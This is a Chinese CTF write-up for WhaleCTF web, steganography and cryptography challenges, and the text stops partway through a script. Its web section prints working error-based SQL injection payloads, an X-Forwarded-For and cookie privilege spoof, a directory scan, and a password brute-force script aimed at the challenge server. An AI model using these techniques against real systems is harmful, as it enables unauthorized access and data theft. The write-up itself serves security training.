---
layout: post
title: WhaleCTF WriteUp
date: 2018-2-5
author: Qiqi
header-img: img/images-1.jpg
catalog: true
tag:
   - Writeup
   - CTF
---

# WhaleCTF WriteUp

## Web

### SQL注入

首先，我们输入1，返回正常页面

然后我们在输入1'，报错

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
```

可以看出，这题我们不需要去闭合引号啥的

接着，我们利用order by语句，查询列数

```sql
1 order by 1
```

最终得到一共有4列

接着进入正题，我们这里使用xmlupdate的报错注入

**1. 查询数据库名**

```sql
1 and updatexml(1,concat(0x7e,(mid((select database()),1,31))),1)
```

提交，成功得到数据库名

```sql
XPATH syntax error: '~sqli'
```

**2. 查询表名**

```sql
1 and updatexml(1,concat(0x7e,(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,31))),1)
```

提交得到

```Sql
XPATH syntax error: '~flag'
```

很显然，这就是flag所在的表

**3. 查询列名**

```sql
1 and updatexml(1,concat(0x7e,(mid((select column_name from information_schema.columns where table_schema=database() and table_name='flag' limit 0,1),1,31))),1)
```

提交得到

```sql
XPATH syntax error: '~flag'
```

也很显然，flag肯定在这一列

**4. 查询字段**

```sql
1 and updatexml(1,concat(0x7e,(mid((select flag from flag limit 0,1),1,31))),1)
```

提交得到

```sql
XPATH syntax error: '~abcd1234'
```

根据题目要求，flag{abcd1234}

### Find me

查看源代码

在注释中找到flag:{This_is_s0_simpl3}

### http呀

这题想了好久，然而毫无思路，于是最终拿去扫了一下，这里我用的dirsearch，也可以用御剑

```
qiqi@qiqi-Mac ~/dirsearch> python3 dirsearch.py -u "http://39.107.92.230/web/web2" -e * -t 60

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: CHANGELOG.md | Threads: 60 | Wordlist size: 6029

Error Log: /Users/qiqi/dirsearch/logs/errors-18-02-02_21-46-54.log

Target: http://39.107.92.230/web/web2

[21:46:54] Starting:
[21:47:04] 200 -  315B  - /web/web2/index.html
[21:47:04] 200 -  405B  - /web/web2/index.php
[21:47:04] 200 -  405B  - /web/web2/index.php-bak
[21:47:04] 200 -  405B  - /web/web2/index.php.bak
[21:47:04] 200 -  405B  - /web/web2/index.php/login/
[21:47:04] 200 -  405B  - /web/web2/index.php3
[21:47:04] 200 -  405B  - /web/web2/index.php5
[21:47:04] 200 -  405B  - /web/web2/index.php~
[21:47:04] 200 -  405B  - /web/web2/index.php4
```

我们看到了index.php这个文件

我们用curl看一下返回结果

```
qiqi@qiqi-Mac ~> curl http://39.107.92.230/web/web2/index.php
<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Careful</title>
</head>
<body alink="#007000"  bgcolor="#000000" link="gold" text="#008000" vlink="#00c000">
<center>
<br><br>
<center>
<h1>Do you know what happend just now?!</h1>
<script>
window.location.href="index.html";
</script>
</center>
<br>
<br>
<br>
<!--flag:{Y0u_ar3_s0_Car3ful}-->
</html>
```

这样我们就得到了flag:{Y0u_ar3_s0_Car3ful}

### 本地登陆

题目要求本地登陆，我们很容易想到XFF头

所以抓包添加XFF头部

X-Forwarded-For: 127.0.0.1

得到新的提示：You are not admin.Get out!

于是我们还要将isadmin的值改为1

最终成功得到flag:{Why_ar3_y0u_s0_dia0}

### 密码泄露

查看源代码，发现password.txt文件，发现里面有很多密码，但我们不可能一个一个去试

直接上python

```python
import requests
url = "http://39.107.92.230/web/web5/password.txt"
r = requests.get(url)
res = r.text.split('\r\n')
for i in res:
  r = requests.post("http://39.107.92.230/web/web5/index.php", data={'username':'admin', 'password':i})
  if "False" not in r.text:
    print i
    break
```

得到密码：Nsf0cuS

输入，进入新页面，说这里没有flag

我们打开开发者工具，在Network选项中，我们在cookie一栏，看到newpage，后面是一串很像base64编码的字符，解码得到290bca70c7dae93db6644fa00b9d83b9.php

进入页面，提示要以小黑的身份留言

于是抓包

将IsLogin的值改为1

一开始尝试把userlevel改为admin，后来发现应该改为root

发送请求，在Set-Cookie头部看到Flag=flag%7BC0ngratulati0n%7D

URL编码解码得到flag{C0ngratulati0n}

## 隐写

### Find

根据图片的名称，得到提示，应该是LSB隐写，用神器stegsolve打开，找到一张二维码，但和我们通常看到的二维码不太一样，黑白颜色是反着的，所以我们用ps反色一下，扫码得到flag{hctf_3xF$235#\\x5e3}

### 被我吃了

binwalk跑一下

```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
103315        0x19393         Zip archive data, at least v2.0 to extract, compressed size: 25, uncompressed size: 23, name: flag.txt
103468        0x1942C         End of Zip archive
```

看到存在zip压缩包

再用一下foremost

打开压缩包，发现flag.txt，打开得到flag{WelcomeT3WhaleCTF}

### 合体鲸鱼

还是用binwalk跑一下

```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
103315        0x19393         JPEG image data, JFIF standard 1.01
```

发现有两张jpg图片

用一下foremost，得到两张jpg图片，其中一张就是flag：flag{youfindmeWHALE}

### 亚种

用0xED打开看一下

直接查找flag，找到flag{firsttry}

### 下雨天

预览打开图片，看到一共有6张图片，flag就藏在第5张里：GUETCTF{Y0u_sEE_m3}

### 这是什么

用0xED打开，在最后发现一串&#ACSII编码的字符串

```
&#102;&#108;&#97;&#103;&#123;&#112;&#69;&#51;&#107;&#81;&#122;&#109;&#97;&#77;&#78;&#125;
```

解码得到flag{pE3kQzmaMN}

### IHDR

IHDR一般是要修改图片的长度，使图片的下面的部分显示出来

所以我们要修改图片的长度

用notepad++打开

png头部：89 50 4E 47 0D 0A 1A 0A

IHDR：0d 49 48 44 52  

接着后四位是宽度，我们不要去调，再后四位是长度，我们要调大一些

我们将09 90改为0f f0

打开图片，得到FLAG{ihDR_ALSO_FUN}

### 愤怒的小猪

还是由图片的名字猜测应该是LSB隐写，用stegsolve打开

找到一张二维码

扫一下得到flag{AppLeU0}

### 底片

图片名称写的是jpg格式，其实是个bmp格式的

通过题目信息，猜测是LSB隐写（这题不是在最低位隐藏了二维码，而是将最低层次的二进制代码直接替换为flag的ASCII码）

BMP文件头部：

| 字段名         | 大小（单位：字节） | 描述                                     |
| :---------- | :-------- | :------------------------------------- |
| bfType      | 2         | 位图类别，根据不同的操作系统而不同，在Windows中，此字段的值总’BM’ |
| bfSize      | 4         | BMP图像文件的大小                             |
| bfReserved1 | 2         | 总为0                                    |
| bfReserved2 | 2         | 总为0                                    |
| bfOffBits   | 4         | BMP图像数据的地址（倒序）                         |

首先读取bfOffBits字段，找到数据块偏移，然后读取数据块，提取最低位，将二进制每八位转换为ASCII即可找到flag

还是写个python脚本

```python
def decode(file):
    f = open(file,'rb').read()
    bfOffBits=int(f[13:9:-1].encode('hex'),16)

    s = ""
    for i in xrange(bfOffBits,len(f)):
        s += str(ord(f[i])&0x1)
    lst = [chr(int(s[i:i+8], 2)) for i in xrange(0, len(s), 8)]
    fsave=open("flag", 'wb')
    fsave.write("".join(lst))
    fsave.close()

decode(raw_input("input file_name: "))
```

运行一下

用notepad++打开生成的文件得到flag：key_is_SimCTF{LSB_yinxie}

### 真是动图

图片无法打开，用notepad++打开，发现头部缺少GIF8，正常gif头部是GIF89(7)a

修改一下，发现能正常打开了

查看每一张图，得到：PASSWORD is Y2F0Y2hfdGhlX2R5bmFtaWNfZmxhZ19pc19xdWl0ZV9zaW1wbGU=

base64解码得到catch_the_dynamic_flag_is_quite_simple，所以flag就是key{catch_the_dynamic_flag_is_quite_simple}

### 错误压缩

使用pngcheck分析一下图片

```
qiqi@qiqi-Mac ~/Desktop> pngcheck -v sctf.png
File: sctf.png (1421461 bytes)
  chunk IHDR at offset 0x0000c, length 13
    1000 x 562 image, 32-bit RGB+alpha, non-interlaced
  chunk sRGB at offset 0x00025, length 1
    rendering intent = perceptual
  chunk gAMA at offset 0x00032, length 4: 0.45455
  chunk pHYs at offset 0x00042, length 9: 3780x3780 pixels/meter (96 dpi)
  chunk IDAT at offset 0x00057, length 65445
    zlib: deflated, 32K window, fast compression
  chunk IDAT at offset 0x10008, length 65524
  chunk IDAT at offset 0x20008, length 65524
  chunk IDAT at offset 0x30008, length 65524
  chunk IDAT at offset 0x40008, length 65524
  chunk IDAT at offset 0x50008, length 65524
  chunk IDAT at offset 0x60008, length 65524
  chunk IDAT at offset 0x70008, length 65524
  chunk IDAT at offset 0x80008, length 65524
  chunk IDAT at offset 0x90008, length 65524
  chunk IDAT at offset 0xa0008, length 65524
  chunk IDAT at offset 0xb0008, length 65524
  chunk IDAT at offset 0xc0008, length 65524
  chunk IDAT at offset 0xd0008, length 65524
  chunk IDAT at offset 0xe0008, length 65524
  chunk IDAT at offset 0xf0008, length 65524
  chunk IDAT at offset 0x100008, length 65524
  chunk IDAT at offset 0x110008, length 65524
  chunk IDAT at offset 0x120008, length 65524
  chunk IDAT at offset 0x130008, length 65524
  chunk IDAT at offset 0x140008, length 65524
  chunk IDAT at offset 0x150008, length 45027
  chunk IDAT at offset 0x15aff7, length 138
  chunk IEND at offset 0x15b08d, length 0
No errors detected in sctf.png (28 chunks, 36.8% compression).
```

发现倒数第二个IDAT块还没有填充完，就有新生成了一个IDAT块，猜测信息应该就藏在这个块中

用16进制编辑器打开，找到偏移量为0x15aff7的地方，发现是IDAT的标识位，于是我们从IDAT块的起始位置往后找138个长度，得到：

```
789C5D91011280400802BF04FFFF5C75294B5537738A21A27D1E49CFD17DB3937A92E7E603880A6D485100901FB0410153350DE83112EA2D51C54CE2E585B15A2FC78E8872F51C6FC1881882F93D372DEF78E665B0C36C529622A0A45588138833A170A2071DDCD18219DB8C0D465D8B6989719645ED9C11C36AE3ABDAEFCFC0ACF023E77C17C7897667
```

而png图片的压缩方式是zlib，所以我们写个python脚本解压一下

```python
#coding:utf-8

import zlib
import binascii

IDAT = "789C5D91011280400802BF04FFFF5C75294B5537738A21A27D1E49CFD17DB3937A92E7E603880A6D485100901FB0410153350DE83112EA2D51C54CE2E585B15A2FC78E8872F51C6FC1881882F93D372DEF78E665B0C36C529622A0A45588138833A170A2071DDCD18219DB8C0D465D8B6989719645ED9C11C36AE3ABDAEFCFC0ACF023E77C17C7897667".decode('hex')

result = binascii.hexlify(zlib.decompress(IDAT))
bin = result.decode('hex')

print bin
print '\r\n'
print len(bin)
```

运行一下：

```
1111111000100001101111111100000101110010110100000110111010100000000010111011011101001000000001011101101110101110110100101110110000010101011011010000011111111010101010101111111000000001011101110000000011010011000001010011101101111010101001000011100000000000101000000001001001101000100111001111011100111100001110111110001100101000110011100001010100011010001111010110000010100010110000011011101100100001110011100100001011111110100000000110101001000111101111111011100001101011011100000100001100110001111010111010001101001111100001011101011000111010011100101110100100111011011000110000010110001101000110001111111011010110111011011


625
```

一串01字符串，长度是625，是25的平方，猜测可能是个二维码

所以我们写个脚本来生成一下，试一试

```python
from PIL import Image

MAX = 25
pic = Image.new("RGB", (MAX, MAX))
str = "1111111000100001101111111100000101110010110100000110111010100000000010111011011101001000000001011101101110101110110100101110110000010101011011010000011111111010101010101111111000000001011101110000000011010011000001010011101101111010101001000011100000000000101000000001001001101000100111001111011100111100001110111110001100101000110011100001010100011010001111010110000010100010110000011011101100100001110011100100001011111110100000000110101001000111101111111011100001101011011100000100001100110001111010111010001101001111100001011101011000111010011100101110100100111011011000110000010110001101000110001111111011010110111011011"

i = 0
for y in range(0, MAX):
    for x in range(0, MAX):
        if(str[i] == '1'):
            pic.putpixel([x, y], (0, 0, 0))
        else:
            pic.putpixel([x, y], (255, 255, 255))
        i = i + 1

pic.show()
pic.save("flag.png")
```

运行一下，真的得到了一个二维码，扫一下得到SCTF{(121.518549,25.040854)}

### 斗鸡眼

扔binwalk里看一下

```
qiqi@qiqi-Mac ~/Desktop> binwalk final.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1440 x 900, 8-bit/color RGB, non-interlaced
41            0x29            Zlib compressed data, default compression
1922524       0x1D55DC        PNG image, 1440 x 900, 8-bit/color RGB, non-interlaced
1922565       0x1D5605        Zlib compressed data, default compression

```

发现有两张图片

用foremost分离一下得到两张看上去一模一样的图片

使用stegsolve对比两张图片并进行XOR，导出，用16进制编辑器查

```
3400003500003400003300003200003300003300003300003200003300003200003000003100003100003000003000003000002E00002F00002F00002E00002C00002C00002C00002E00002F00002F00002F00002F00002E00002F00002F00002F00002E00002F00002F00002F00003100003000003100002E00002E00002E00002E00002F00002E00003000003000003100003000003000003000003100003100003000003000003100003000003000003100003100003000002F00002E00003000003100002F00003100002E00003100002E00003100003000003100003000003100003000003000003100003100003000003100003100003100003000003100003000003000003000003100003000003000003000003100003000003100002F00003000003300003400003400003600003900003900003C00003B00003D00003D00003C00003B000039000036000032000033000033000031000030000031000031000030000031000031000030000030000031000031000031000031000031000030000030000031000031000030000030000030000031000030000031000030000031000031000030000031000031000031000030000030000031000030000031000031000030000031000031000031000030000030000030000030000030000031000030000030000031000030000030000030000031000030000030000030000030000031000031000030000031000030000030000030000030000030000031000030
```

这样一段存在差异

使用python将差异部分进行提取

```python
from PIL import Image

img1 = Image.open("1.png")
im1 = img1.load()
img2 = Image.open("2.png")
im2 = img2.load()

for x in range(img1.size[0]):
	for y in range(img1.size[1]):
    	if(im1[x, y] != im2[x, y]):
        	print im1[x, y], im2[x, y]
```

运行一下，得到

```
(52, 97, 182) (0, 97, 182)
(52, 97, 182) (1, 97, 182)
(52, 97, 182) (0, 97, 182)
(51, 96, 181) (0, 96, 181)
(51, 96, 181) (1, 96, 181)
(51, 96, 181) (0, 96, 181)
(51, 96, 181) (0, 96, 181)
(50, 95, 180) (1, 95, 180)
(50, 95, 180) (0, 95, 180)
(50, 95, 180) (1, 95, 180)
(50, 95, 180) (0, 95, 180)
(49, 94, 179) (1, 94, 179)
(49, 94, 179) (0, 94, 179)
(49, 94, 179) (0, 94, 179)
(49, 94, 179) (1, 94, 179)
(49, 94, 179) (1, 94, 179)
(48, 95, 177) (0, 95, 177)
(47, 94, 176) (1, 94, 176)
(47, 93, 178) (0, 93, 178)
(47, 93, 178) (0, 93, 178)
(46, 92, 178) (0, 92, 178)
(45, 91, 179) (1, 91, 179)
(45, 91, 179) (1, 91, 179)
(45, 91, 179) (1, 91, 179)
(46, 90, 179) (0, 90, 179)
(46, 90, 179) (1, 90, 179)
(46, 90, 179) (1, 90, 179)
(46, 90, 179) (1, 90, 179)
(46, 90, 179) (1, 90, 179)
(46, 90, 179) (0, 90, 179)
(46, 90, 179) (1, 90, 179)
(46, 90, 179) (1, 90, 179)
(47, 91, 178) (0, 91, 178)
(47, 91, 178) (1, 91, 178)
(47, 91, 178) (0, 91, 178)
(47, 91, 178) (0, 91, 178)
(47, 91, 178) (0, 91, 178)
(48, 92, 179) (1, 92, 179)
(48, 92, 179) (0, 92, 179)
(48, 92, 179) (1, 92, 179)
(46, 92, 178) (0, 92, 178)
(46, 92, 178) (0, 92, 178)
(47, 93, 179) (1, 93, 179)
(47, 93, 179) (1, 93, 179)
(47, 93, 179) (0, 93, 179)
(47, 93, 179) (1, 93, 179)
(48, 94, 180) (0, 94, 180)
(48, 94, 180) (0, 94, 180)
(49, 95, 181) (0, 95, 181)
(49, 95, 181) (1, 95, 181)
(49, 95, 181) (1, 95, 181)
(49, 95, 181) (1, 95, 181)
(49, 95, 181) (0, 95, 181)
(49, 95, 181) (0, 95, 181)
(49, 95, 181) (1, 95, 181)
(49, 95, 181) (1, 95, 181)
(49, 94, 179) (0, 94, 179)
(49, 94, 179) (1, 94, 179)
(48, 93, 178) (0, 93, 178)
(48, 93, 178) (1, 93, 178)
(48, 93, 178) (1, 93, 178)
(48, 93, 178) (0, 93, 178)
(47, 92, 177) (0, 92, 177)
(47, 92, 177) (1, 92, 177)
(48, 94, 180) (0, 94, 180)
(48, 94, 180) (1, 94, 180)
(47, 93, 179) (0, 93, 179)
(48, 92, 179) (1, 92, 179)
(47, 91, 178) (1, 91, 178)
(48, 89, 177) (1, 89, 177)
(47, 88, 176) (1, 88, 176)
(48, 88, 176) (1, 88, 176)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (1, 89, 177)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (1, 89, 177)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (1, 89, 177)
(48, 89, 177) (1, 89, 177)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (1, 89, 177)
(48, 89, 177) (1, 89, 177)
(48, 89, 177) (1, 89, 177)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (1, 89, 177)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (1, 89, 177)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (1, 89, 177)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (1, 89, 177)
(47, 92, 177) (0, 92, 177)
(49, 91, 177) (1, 91, 177)
(50, 92, 176) (1, 92, 176)
(52, 92, 177) (0, 92, 177)
(52, 93, 175) (0, 93, 175)
(55, 93, 176) (1, 93, 176)
(56, 94, 175) (1, 94, 175)
(56, 94, 175) (1, 94, 175)
(60, 93, 170) (0, 93, 170)
(59, 95, 173) (0, 95, 173)
(60, 95, 176) (1, 95, 176)
(60, 97, 178) (1, 97, 178)
(60, 96, 180) (0, 96, 180)
(58, 95, 183) (1, 95, 183)
(57, 94, 183) (0, 94, 183)
(54, 94, 182) (0, 94, 182)
(50, 91, 179) (0, 91, 179)
(50, 91, 179) (1, 91, 179)
(50, 91, 179) (1, 91, 179)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (1, 90, 178)
(48, 89, 177) (1, 89, 177)
(48, 89, 177) (1, 89, 177)
(48, 89, 177) (0, 89, 177)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (0, 90, 178)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (1, 89, 177)
(48, 89, 177) (1, 89, 177)
(48, 89, 177) (1, 89, 177)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (1, 89, 177)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (1, 89, 177)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (0, 89, 177)
(48, 89, 177) (0, 89, 177)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (1, 90, 178)
(49, 90, 178) (0, 90, 178)
(49, 90, 178) (1, 90, 178)
```

发现前两位都一样，但第一位存在差异，而且第二章图片的最后一位都是0或者1，猜想可能隐藏了数据

所以我们要把01段提取出来，8位一组，转为字符，得到字符串，应该就是flag

所以我们修改一下上面的脚本

```python
from PIL import Image
import binascii
import re

img1 = Image.open("1.png")
im1 = img1.load()
img2 = Image.open("2.png")
im2 = img2.load()

s=''

for x in range(img1.size[0]):
    for y in range(img1.size[1]):
        if(im1[x, y] != im2[x, y]):
            s = s + str(im2[x, y][0])

s = str.strip(re.sub(r'(\d{8})', r'\1 ', s))
a = ''.join([chr(i) for i in [int(b, 2) for b in s.split(' ')]])
lista = ''.join(a)
print lista
```

运行一下得到ISG{E4sY_StEg4n0gR4pHy}

## 密码学

### Death_Chain

百度一下夏多的密码

![](https://ws1.sinaimg.cn/large/006Vib6xgy1fno4twfu0gj30cx0s0jt0.jpg)

解码得到FLAGISHELPMEOUTPLEASE

⚠️题目中说，所有解密内容，我就在这栽了:sweat:

最终的flag是flag{FLAGISHELPMEOUTPLEASE}

### 先有什么

这题发现每段字符串的字符在键盘上的位置都很接近，然后发现，每段字符串都会在键盘上包围住一个字母，按顺序读一下得到vanusectf

所以flag就是key{venusectf}

### 检查符号

摩斯电码的变形

将o替换为.

将0替换为-

将。替换为空格或者/

解码得到WELCOMETOVENUSCTF

⚠️我们要将字母改为小写

所以flag是key{welcometovenusctf}

### 德军密码

```
0000011000000000101010110111001011000101100000111001100100111100111001
```

从密文长度和密钥helloworld的长度猜测应该是将密文7个一组分成10个7位二进制数，然后鱼密钥进行异或处理

写个python脚本

```python
str_bin = raw_input("str_bin:")
str_key = raw_input("str_key:")
list_bin = []
flag = ''
for i in range(len(str_key)):
    list_bin.append(str_bin[7 * i : 7 * i + 7])
for i in range(len(str_key)):
    flag += chr(int(list_bin[i], 2) ^ ord(str_key[i]))
print flag
```

运行得到：key[yahkr]

所以flag是key{yahkr}

### 密钥生成

利用拓欧算法写个python脚本：

```python
def ext_euclid ( a , b ):
     if (b == 0):
         return 1, 0, a
     else:
         x , y , q = ext_euclid( b , a % b )
         x , y = y, ( x - (a / b) * y )
         return x, y, q
         
p=473398607161
q=4511491
e = 17
fn = (p - 1) * (q - 1)
x, y, q = ext_euclid(fn, e)
print y
```

输出：125631357777427553

所以flag是key{125631357777427553}

### 规则很公平

根据提示：**公平**

想到了**波雷费密码**（英语：**Playfair cipher**）

本题密码标如下：

C	U	L	T	R

E	A	B	D	F

G	H	I	K	M

N	O	P	Q	S

V	W	X	Y	Z

密文：CGOCPMOFEBMLUNISEOZY

两两一组：

CG	OC	PM	OF	EB	ML	UN	IS	EO	ZY

解密：

VE	NU	SI	SA	FA	IR	CO	MP	AN	YX

可以看出最后的X是补加的，所以我们要把它去掉

所以flag就是：key{VENUSISAFAIRCOMPANY}

我们也可以使用python第三方库pycipher中的Playfair来解密

```python
>>> from pycipher import Playfair
>>> Playfair('ZKLIPOAGSUMDWFHCBVTRYENXQ').decipher('FMGKYBXTSFBNCQDSPT')
'WHALECTFISVERYFAIR'
```

我们也可以自己写一个python脚本

```python
#coding:utf-8

str_1 = raw_input("input the 25 letters: ") # 25位，写成5*5的密码表
str_2 = ""
str_3 = ""
str_4 = "abcdefghiklmnopqrstuvwxyz" #去掉 j 因为ij在一起
str_5 = ""
str_6 = raw_input("input the rule: ") #要解密的规则  两两分组
list_1 = []
str_7 = ""

def zhongheng(abc, adc):
    a = 0
    x1 = ""
    y1= ''
    x2 = ""
    y2 = ""
    for i in list_1:
        i = list(i)
        if abc in i:
            x1 = a
            y1 = i.index(abc)

        else:
            pass
        if adc in i:
            x2 = a
            y2 = i.index(adc)
        else:
            pass
        a += 1
    print x1, y1, x2, y2

    if x1 == x2:
        if y1 == 0 and y2 == 0:
            return str(list_1[x1][4]) + str(list_1[x2][4])
        if y1 == 0 and y2 != 0:
            return str(list_1[x1][4]) + str(list_1[x2][y2 - 1])
        if y1 != 0 and y2 == 0:
            return str(list_1[x1][y1 - 1]) + str(list_1[x2][4])
        else:
            return str(list_1[x1][y1 - 1]) + str(list_1[x2][y2 - 1])

    if y1 == y2:
        if x1 == 0 and x2 == 0:
            return str(list_1[4][y2]) + str(list_1[4][y2])
        if x1 == 0 and x2 != 0:
            return str(list_1[4][y1]) + str(list_1[x2 - 1][y2])
        if x1 != 0 and x2 == 0:
            return str(list_1[x1 - 1][y1])+ str(list_1[4][y2])
        else:
            return str(list_1[x1 - 1][y1]) + str(list_1[x2 - 1][y2])

    aaie = str(list_1[x1][y2]) + str(list_1[x2][y1])
    return aaie


#去除空格
for i in str_1:
    str_2 += i.strip(" ")

#去掉重复和j
for i in str_2:
    if i in str_3:
        pass
    elif i == "j":
        pass
    else:
        str_3 += i

#填完密钥出现的字母后，若还有空余，就填字母表中剩余的字母（按字母表顺序）
for i in str_4:
    if i in str_3:
        pass
    else:
        str_5 += i
str_3 += str_5

flag = ""

#分为 5x5 的数组
for i in range(5):
    list_1.append(str_3[i * 5 : i * 5 + 5])

for i in range(0, len(str_6), 2):
    flag += zhongheng(str(str_6[i]), str(str_6[i+1]))
print "flag: " + flag
```
跑一下，也能得到相同的结果

### 此处应写

打开文本

```
_____*((__//__+___+______-____%____)**((___%(___-_))+________+(___%___+_____+_______%__+______-(______//(_____%___)))))+__*(((________/__)+___%__+_______-(________//____))**(_*(_____+_____)+_______+_________%___))+________*(((_________//__+________%__)+(_______-_))**((___+_______)+_________-(______//__)))+_______*((___+_________-(______//___-_______%__%_))**(_____+_____+_____))+__*(__+_________-(___//___-_________%_____%__))**(_________-____+_______)+(___+_______)**(________%___%__+_____+______)+(_____-__)*((____//____-_____%____%_)+_________)**(_____-(_______//_______+_________%___)+______)+(_____+(_________%_______)*__+_)**_________+_______*(((_________%_______)*__+_______-(________//________))**_______)+(________/__)*(((____-_+_______)*(______+____))**___)+___*((__+_________-_)**_____)+___*(((___+_______-______/___+__-_________%_____%__)*(___-_+________/__+_________%_____))**__)+(_//_)*(((________%___%__+_____+_____)%______)+_______-_)**___+_____*((______/(_____%___))+_______)*((_________%_______)*__+_____+_)+___//___+_________+_________/___
```

感觉应该是数学表达式，猜想下划线的个数代表数字，这样就能构成数学算式

再写个脚本，计算一下结果

```python
s = '_____*((__//__+___+______-____%____)**((___%(___-_))+________+(___%___+_____+_______%__+______-(______//(_____%___)))))+__*(((________/__)+___%__+_______-(________//____))**(_*(_____+_____)+_______+_________%___))+________*(((_________//__+________%__)+(_______-_))**((___+_______)+_________-(______//__)))+_______*((___+_________-(______//___-_______%__%_))**(_____+_____+_____))+__*(__+_________-(___//___-_________%_____%__))**(_________-____+_______)+(___+_______)**(________%___%__+_____+______)+(_____-__)*((____//____-_____%____%_)+_________)**(_____-(_______//_______+_________%___)+______)+(_____+(_________%_______)*__+_)**_________+_______*(((_________%_______)*__+_______-(________//________))**_______)+(________/__)*(((____-_+_______)*(______+____))**___)+___*((__+_________-_)**_____)+___*(((___+_______-______/___+__-_________%_____%__)*(___-_+________/__+_________%_____))**__)+(_//_)*(((________%___%__+_____+_____)%______)+_______-_)**___+_____*((______/(_____%___))+_______)*((_________%_______)*__+_____+_)+___//___+_________+_________/___'
ul = s[0]
cnt = 0
exp = ''
for i in s:
    if i is ul:
        cnt += 1
    else:
        if cnt != 0:
            exp += str(cnt)
            cnt = 0
            exp += i
        else:
            exp += i
if cnt != 0:
	exp += str(cnt)
exp = exp.replace('//', '/')
print exp
key = eval(exp)
print key
```

得到算式：

```
5*((2/2+3+6-4%4)**((3%(3-1))+8+(3%3+5+7%2+6-(6/(5%3)))))+2*(((8/2)+3%2+7-(8/4))**(1*(5+5)+7+9%3))+8*(((9/2+8%2)+(7-1))**((3+7)+9-(6/2)))+7*((3+9-(6/3-7%2%1))**(5+5+5))+2*(2+9-(3/3-9%5%2))**(9-4+7)+(3+7)**(8%3%2+5+6)+(5-2)*((4/4-5%4%1)+9)**(5-(7/7+9%3)+6)+(5+(9%7)*2+1)**9+7*(((9%7)*2+7-(8/8))**7)+(8/2)*(((4-1+7)*(6+4))**3)+3*((2+9-1)**5)+3*(((3+7-6/3+2-9%5%2)*(3-1+8/2+9%5))**2)+(1/1)*(((8%3%2+5+5)%6)+7-1)**3+5*((6/(5%3))+7)*((9%7)*2+5+1)+3/3+9+9/3
```

key算出来是：5287002131074331513

瞎捣鼓了半天，发现应该将key转为16进制，再转为字符

```python
key = 5287002131074331513
hk = hex(key)[2:]
ck = ''
for i in range(len(hk) / 2):
	ck += chr(int(hk[i * 2 : i * 2 + 2], 16))
print ck
```

运行一下得到

```
I_4m-k3y
```

所以flag就是key{I_4m-k3y}

### 栅栏密码

提示：第一根和第二根都被换了位置····只有第三根还能站在那，缺也短了一截了

我们将这串字符，三个一行

```
udJ
Zml
2VY
VuW
kdx
XXs
2Ne
1DV
5V9
XEs
2Zd
Z7W
lSN
bVr
m9e
NDS
laF
XG9
1F
```

看起来很符合题意，每一列是一根栅栏

然后我们要将第一列和第二列换个位置,然后一列一列的读取

```
dmVudXNDVEZ7SV9DaGFuZ2VkX215X2Z1bmN1X1J1YWxseV9sdWNreSF9
```

base64解码得到：venusCTF{I_Changed_my_funcu_Rually_lucky!}

### 小明入侵

写个python脚本

```python
import hashlib

str_key = 'key{xxxx}'
str_md5_fore10 = 'a74be8e20b'
list_base = list('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz')
strtmp = list(str_key)
for i in range(len(list_base)):
